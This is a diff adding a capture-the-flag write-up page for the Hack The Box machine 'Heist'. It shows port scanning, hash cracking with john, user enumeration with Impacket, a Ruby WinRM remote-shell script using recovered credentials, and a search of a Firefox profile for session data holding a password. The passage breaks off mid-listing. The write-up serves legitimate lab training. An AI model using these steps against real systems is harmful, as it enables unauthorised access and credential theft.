@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Heist</strong></h1>
+        <em>Released: 10th August 2019 / Pwned: August 23rd 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Heist starts with a web server and a set of encrypted passwords to crack. Using the cracked credentials, you enumerate usernames on the target system and get a user shell using a WinRM ruby script. On the system, a todo.txt file is the start of a trail leading to a Firefox profile and an admin/password credentials in a backup session file.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Login as guest on the website and find a set of passwords from a user who is having config issues<br>
+        • Crack the passwords in config.txt<br>
+        • Use credentials and Impacket's <code>lookupsid.py</code> to enumerate for users on the target system<br>
+        • Get a shell on the system using a WinRM ruby script<br>
+        • Read a backup Firefox session file containing the Administrator password<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Full port scan:<br>
+        <code>nmap -p- -sV -oN nmap/full.txt 10.10.10.149</code><br>
+        <br>
+        -sV service enumeration<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/heist#&nbsp;nmap&nbsp;-p-&nbsp;-sV&nbsp;-oN&nbsp;nmap/full.txt&nbsp;10.10.10.149<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;10.0<br>
+                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                445/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds?<br>
+                5985/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;(SSDP/UPnP)<br>
+                49668/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • <code>80/http</code> - A website. Will be the first place to look<br>
+        • <code>135/rpc</code> - Remote Procedure Call is running - useful to know for later<br>
+        • <code>445/tcp</code> - Can't authenticate using a NULL session, so nothing to be gained here. Later on with creds, the share still doesn't give anything<br>
+        • <code>5985/httpAPI</code> - Comes in handy later to execute commands remotely and gain a shell<br>
+        • <code>49668/rpc</code> - More RPC<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - Support Login Page</strong></h2><br>
+        <code>http://10.10.10.149</code> redirects to <code>http://10.10.10.149/login.php,</code> which appears to be a login page for customer support.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        No credentials have been found yet, so <code>Login as guest</code>.<br>
+        (bottom right)<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        A user called <code>Hazard</code> is having some issues with his cisco router.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        If you look at the <code>config.txt</code> they attached, you'll find some cisco credentials.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Crack config.txt Passwords</strong></h2><br>
+        All 3 passwords in <code>config.txt</code> can be cracked.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>3a) secret</strong></h3><br>
+        <code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code> can be cracked using <code>john</code>.<br>
+        <code>echo</code> the hash into a file and run <code>john</code> with <code>rockyou.txt</code> as the wordlist.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;echo&nbsp;"$1$pdQG$o8nrSzsGXeaduXrjlvKc91"&nbsp;&gt;&nbsp;cisco.hash<br>
+                root@gotham:~/ctf/heist#&nbsp;john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;cisco.hash<br>
+                Using&nbsp;default&nbsp;input&nbsp;encoding:&nbsp;UTF-8<br>
+                Loaded&nbsp;1&nbsp;password&nbsp;hash&nbsp;(md5crypt,&nbsp;crypt(3)&nbsp;$1$&nbsp;[MD5&nbsp;32/32])<br>
+                Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
+                Press&nbsp;'q'&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;for&nbsp;status<br>
+                0g&nbsp;0:00:00:10&nbsp;0.82%&nbsp;(ETA:&nbsp;02:44:06)&nbsp;0g/s&nbsp;13989p/s&nbsp;13989c/s&nbsp;13989C/s&nbsp;h0rses..frogs07<br>
+                0g&nbsp;0:00:00:17&nbsp;1.46%&nbsp;(ETA:&nbsp;02:43:12)&nbsp;0g/s&nbsp;14484p/s&nbsp;14484c/s&nbsp;14484C/s&nbsp;copper6..cinnomon<br>
+                0g&nbsp;0:00:02:19&nbsp;12.06%&nbsp;(ETA:&nbsp;02:43:03)&nbsp;0g/s&nbsp;13673p/s&nbsp;13673c/s&nbsp;13673C/s&nbsp;coco0406..coca1998<br>
+                0g&nbsp;0:00:03:37&nbsp;20.12%&nbsp;(ETA:&nbsp;02:41:49)&nbsp;0g/s&nbsp;14156p/s&nbsp;14156c/s&nbsp;14156C/s&nbsp;trampil..tramazi<br>
+                stealth1agent&nbsp;&nbsp;&nbsp;&nbsp;(?)<br>
+                1g&nbsp;0:00:04:05&nbsp;DONE
+            </div>
+        </div><br>
+        <br>
+        • <code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code> = <code>stealth1agent</code><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3b) user passwords</strong></h3><br>
+        The cisco user passwords are trivial to crack, just input the hashes here - <a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a><br>
+        <br>
+        • username <code>rout3r</code> password 7 <code>$uperP@ssword</code><br>
+        • username <code>admin</code> privilege 15 password 7 <code>Q4)sJu\Y8qz*A3?d</code><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3c) hazard / stealth1agent</strong></h3><br>
+        Those usernames/passwords don't work with any of the services running.<br>
+        On the <code>Issues</code> page, <code>Hazard</code> asked for an account on the target system, which gives you a potential username to try with the <code>stealth1agent</code> pass.<br>
+        <br>
+        <code>hazard / stealth1agent</code> can be used to log in to SMB, but the connection will time out after you connect.<br>
+        Instead, <code>hazard</code>'s credentials can be used with RPC.<br>
+        <br>
+        To test if the credentials work, I ran Impacket's <code>rpcdump.py</code> which gathers information about endpoints on the target system.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;rpcdump.py&nbsp;hazard:stealth1agent@10.10.10.149<br>
+                Impacket&nbsp;v0.9.20-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                [*]&nbsp;Retrieving&nbsp;endpoint&nbsp;list&nbsp;from&nbsp;10.10.10.149<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        But that outputs a lot of junk.<br>
+        With working credentials, you can now use Impacket's <code>lookupsid.py</code> to enumerate for usernames on the target system.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;lookupsid.py&nbsp;hazard:stealth1agent@10.10.10.149<br>
+                Impacket&nbsp;v0.9.20-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                [*]&nbsp;Brute&nbsp;forcing&nbsp;SIDs&nbsp;at&nbsp;10.10.10.149<br>
+                [*]&nbsp;StringBinding&nbsp;ncacn_np:10.10.10.149[\pipe\lsarpc]<br>
+                [*]&nbsp;Domain&nbsp;SID&nbsp;is:&nbsp;S-1-5-21-4254423774-1266059056-3197185112<br>
+                500:&nbsp;SUPPORTDESK\Administrator&nbsp;(SidTypeUser)<br>
+                501:&nbsp;SUPPORTDESK\Guest&nbsp;(SidTypeUser)<br>
+                503:&nbsp;SUPPORTDESK\DefaultAccount&nbsp;(SidTypeUser)<br>
+                504:&nbsp;SUPPORTDESK\WDAGUtilityAccount&nbsp;(SidTypeUser)<br>
+                513:&nbsp;SUPPORTDESK\None&nbsp;(SidTypeGroup)<br>
+                1008:&nbsp;SUPPORTDESK\Hazard&nbsp;(SidTypeUser)<br>
+                1009:&nbsp;SUPPORTDESK\support&nbsp;(SidTypeUser)<br>
+                1012:&nbsp;SUPPORTDESK\Chase&nbsp;(SidTypeUser)<br>
+                1013:&nbsp;SUPPORTDESK\Jason&nbsp;(SidTypeUser)<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Now you have a list of usernames you can try with the cracked passwords above.<br>
+        On Windows systems, with user credentials, you can often spawn a shell.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Chase Shell</strong></h2><br>
+        The go-to, now deprecated, way to get a shell on Windows systems with user credentials is <code>winexe</code>.<br>
+        Instead, you can use WinRM.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4a) WinRM</strong></h3><br>
+        WinRM stands for Windows Remote Management, and is recommended by Microsoft as the best way to manage systems remotely.<br>
+        WinRM receives commands via PowerShell remoting, which must be enabled in powershell by running <code>Enable-PSRemoting</code> - <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting</a><br>
+        PowerShell remoting is enabled on Windows Server 2012 by default.<br>
+        <br>
+        Communicating with WinRM from Linux isn't very well developed.<br>
+        <a href="https://alamot.github.io/winrm_shell/">https://alamot.github.io/winrm_shell/</a><br>
+        Alamot mentions that “PowerShell on Linux isn't mature� and that most python modules don't communicate correctly with WinRM.<br>
+        The only reliable library to communcate from Linux to Windows via WinRM is Ruby's <code>winrm</code> library.<br>
+        <br>
+        Alamot has written a shell-spawning script using this WinRM library - all credit for the following code goes to him!!<br>
+        Original code is here - <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb</a><br>
+        <br>
+        SSL transport isn't needed, so the above script has been modified to remove it.<br>
+        <br>
+        Authenticate using <code>Chase</code> and <code>Q4)sJu\Y8qz*A3?d</code> to get a shell on the system.<br>
+        (i couldn't find any hint that Chase was the correct user for the admin password, I just tried every username/password combination (manually) until I got a hit)<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">require</span>&nbsp;<span style="color:#3ad900;font-weight:400">'winrm'</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Author:&nbsp;Alamot</span><br>
+                <br>
+                conn&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">WinRM::Connection</span>.new(&nbsp;<br>
+                &nbsp;&nbsp;endpoint:&nbsp;<span style="color:#3ad900;font-weight:400">'http://10.10.10.149:5985/wsman'</span>,<br>
+                &nbsp;&nbsp;user:&nbsp;<span style="color:#3ad900;font-weight:400">'Chase'</span>,<br>
+                &nbsp;&nbsp;password:&nbsp;<span style="color:#3ad900;font-weight:400">'Q4)sJu\Y8qz*A3?d'</span>,<br>
+                )<br>
+                <br>
+                command=<span style="color:#3ad900;font-weight:400">""</span><br>
+                <br>
+                conn.shell(<span style="color:#ff0044;font-weight:400">:powershell</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;|shell|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">until</span>&nbsp;command&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"exit\n"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">do</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;shell.run(<span style="color:#3ad900;font-weight:400">"-join($id,'PS&nbsp;',$(whoami),'@',$env:computername,'&nbsp;',$((gi&nbsp;$pwd).Name),'&gt;&nbsp;')"</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(output.output.chomp)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command&nbsp;=&nbsp;gets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;shell.run(command)&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;|stdout,&nbsp;stderr|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">STDOUT</span>.print&nbsp;stdout<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">STDERR</span>.print&nbsp;stderr<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">end</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">end</span>&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;puts&nbsp;<span style="color:#3ad900;font-weight:400">"Exiting&nbsp;with&nbsp;code&nbsp;#{output.exitcode}"</span><br>
+                <span style="color:#ff9d00;font-weight:700">end</span>
+            </div>
+        </div><br>
+        <br>
+        Run the script with <code>ruby &lt;script&gt;.rb</code> and grab <code>user.txt</code>!<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;ruby&nbsp;winrm_alamot.rb<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Documents&gt;&nbsp;cd&nbsp;../Desktop<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Desktop&gt;&nbsp;dir<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users\Chase\Desktop<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:28&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;229376&nbsp;&nbsp;&nbsp;&nbsp;cert9.db<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:29&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;294912&nbsp;&nbsp;&nbsp;&nbsp;key4.db<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;9:08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;121&nbsp;&nbsp;&nbsp;&nbsp;todo.txt<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;9:07&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user.txt<br>
+                <br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Desktop&gt;&nbsp;cat&nbsp;user.txt<br>
+                a127daef7...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) login.php</strong></h2><br>
+        On <code>Chase</code>'s desktop is a <code>todo.txt</code> file.<br>
+            <div class="codebox">
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Desktop&gt;&nbsp;cat&nbsp;todo.txt<br>
+                Stuff&nbsp;to-do:<br>
+                1.&nbsp;Keep&nbsp;checking&nbsp;the&nbsp;issues&nbsp;list<br>
+                2.&nbsp;Fix&nbsp;the&nbsp;router&nbsp;config.<br>
+                <br>
+                Done:<br>
+                1.&nbsp;Restricted&nbsp;access&nbsp;for&nbsp;guest&nbsp;user.
+            </div>
+        </div><br>
+        <br>
+        <code>“Keep checking the issues list�</code> refers to the issues posted on the support site, which prompted me to look at the site's files.<br>
+        <br>
+        The root directory for the website running on port 80 is in <code>C:\inetpub</code><br>
+            <div class="codebox">
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;C:\&gt;&nbsp;cd&nbsp;C:\inetpub<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;inetpub&gt;&nbsp;dir<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\inetpub<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/21/2019&nbsp;&nbsp;&nbsp;5:33&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;custerr<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;6:54&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;history<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;6:50&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logs<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/21/2019&nbsp;&nbsp;&nbsp;5:33&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/21/2019&nbsp;&nbsp;&nbsp;5:42&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wwwroot&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <code>cd</code> to <code>wwwroot</code> and read <code>login.php</code>.<br>
+        At the bottom of the page are some lines of php code which create user sessions.<br>
+            <div class="codebox">
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;wwwroot&gt;&nbsp;cat&nbsp;login.php<br>
+                ...<br>
+                &lt;?php<br>
+                session_start();<br>
+                if(&nbsp;isset($_REQUEST['login'])&nbsp;&amp;&amp;&nbsp;!empty($_REQUEST['login_username'])&nbsp;&amp;&amp;&nbsp;!empty($_REQUEST['login_password']))&nbsp;{<br>
+                if(&nbsp;$_REQUEST['login_username']&nbsp;===&nbsp;'admin@support.htb'&nbsp;&amp;&amp;&nbsp;hash(&nbsp;'sha256',&nbsp;$_REQUEST['login_password'])&nbsp;===&nbsp;'91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040')&nbsp;{<br>
+                $_SESSION['admin']&nbsp;=&nbsp;"valid";<br>
+                header('Location:&nbsp;issues.php');&nbsp;<br>
+                }<br>
+                else<br>
+                header('Location:&nbsp;errorpage.php');<br>
+                }<br>
+                else&nbsp;if(&nbsp;isset($_GET['guest'])&nbsp;)&nbsp;{<br>
+                if(&nbsp;$_GET['guest']&nbsp;===&nbsp;'true'&nbsp;)&nbsp;{<br>
+                $_SESSION['guest']&nbsp;=&nbsp;"valid";<br>
+                header('Location:&nbsp;issues.php');<br>
+                }<br>
+                }<br>
+                ?&gt;
+            </div>
+        </div><br>
+        <br>
+        Unfortunately, <code>admin@support.htb</code>'s password is in hashed sha256 format.<br>
+        • <code>admin@support.htb<br></code>• <code>91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040</code><br>
+        <br>
+        However, this breadcrumb serves as a hint.<br>
+        In the <code>todo.txt</code> file, Chase writes “1. Keep checking the issues list.�, which implies that he's the owner of this admin@support.htb account because he's responsible for replying to any issues posted on the site.<br>
+        <br>
+        Perhaps, then, it's possible to find the unencrypted form of this sha256 hash in Chase's browser/session cookies, considering he will have logged in to the website to reply to issues.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) recovery.jsonlz4</strong></h2><br>
+        Inside <code>C:\Program Files</code> there's a <code>Mozilla Firefox</code> directory, which means that the browser you're targetting is Firefox.<br>
+            <div class="codebox">
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Mozilla&nbsp;Firefox&gt;&nbsp;cd&nbsp;"C:\Program&nbsp;Files"&nbsp;<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Program&nbsp;Files&gt;&nbsp;dir<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Program&nbsp;Files<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/21/2019&nbsp;&nbsp;&nbsp;9:39&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Common&nbsp;Files<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/21/2019&nbsp;&nbsp;11:00&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;internet&nbsp;explorer<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;6:56&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mozilla&nbsp;Firefox<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        On Windows, Firefox stores user data in profiles in 1 or both (often both) of these locations<br>
+        • <code>C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\&lt;profile&gt;.default</code><br>
+        • <code>C:\Users\Chase\AppData\Local\Mozilla\Firefox\Profiles\&lt;profile&gt;.default</code><br>
+        <br>
+        A google search for <code>“firefox extract cookies�</code> reveals that firefox stores a recovery file (that's used to restore a browsing session if firefox closes/crashes) containing cookies/tabs etc. called <code>recovery.jsonlz4</code>.<br>
+        <a href="https://stackoverflow.com/questions/19486161/is-there-a-way-to-extract-cookies-from-the-firefox-cookies-file">https://stackoverflow.com/questions/19486161/is-there-a-way-to-extract-cookies-from-the-firefox-cookies-file</a><br>
+        <br>
+        The above link ^^^ says that <code>recovery.jsonlz4</code> is in a folder called <code>sessionstore-backups</code>.<br>
+        <br>
+        Browse to <code>C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\</code> and you'll find a <code>77nc64t5.default</code> profile with a <code>sessionstore-backups</code> folder and the <code>recovery.jsonlz4 file</code>.<br>
+            <div class="codebox">
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Chase&gt;&nbsp;cd&nbsp;C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Profiles&gt;&nbsp;dir<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
